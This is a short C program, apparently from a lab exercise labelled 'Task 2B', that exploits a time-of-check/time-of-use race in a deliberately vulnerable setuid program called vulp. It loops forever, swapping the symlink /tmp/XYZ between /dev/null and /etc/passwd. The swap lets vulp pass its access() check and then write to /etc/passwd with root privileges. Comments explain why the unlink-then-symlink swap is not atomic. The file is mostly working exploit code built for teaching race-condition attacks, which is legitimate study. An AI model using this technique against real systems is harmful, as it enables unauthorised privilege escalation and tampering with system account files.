/*
 * attack_unlink_symlink.c  -  Task 2B attack program.
 *
 * The vulnerable program vulp runs in a loop (driven by target_process.sh).
 * This program runs in parallel and repeatedly flips the meaning of /tmp/XYZ:
 *
 *   state 1:  /tmp/XYZ -> /dev/null      (the REAL user CAN write here,
 *                                          so vulp's access() check passes)
 *   state 2:  /tmp/XYZ -> /etc/passwd    (what we actually want vulp's
 *                                          root-privileged fopen() to open)
 *
 * We win the race when vulp's access() check runs while /tmp/XYZ points at
 * /dev/null, and vulp's fopen() runs after we have flipped it to /etc/passwd.
 *
 * NOTE: unlink()+symlink() is NOT atomic. There is a moment where /tmp/XYZ
 * does not exist, so sometimes vulp's fopen() fails or hits the wrong target.
 * That is exactly why we must run both programs in a loop and try many times.
 * Task 2C removes this flaw by swapping the two links atomically.
 */

#include <unistd.h>

int main()
{
	while (1) {
		/* point /tmp/XYZ at /dev/null (passes access() for the real user) */
		unlink("/tmp/XYZ");
		symlink("/dev/null", "/tmp/XYZ");
		usleep(1000);

		/* point /tmp/XYZ at /etc/passwd (target of the privileged write) */
		unlink("/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/XYZ");
		usleep(1000);
	}

	return 0;
}
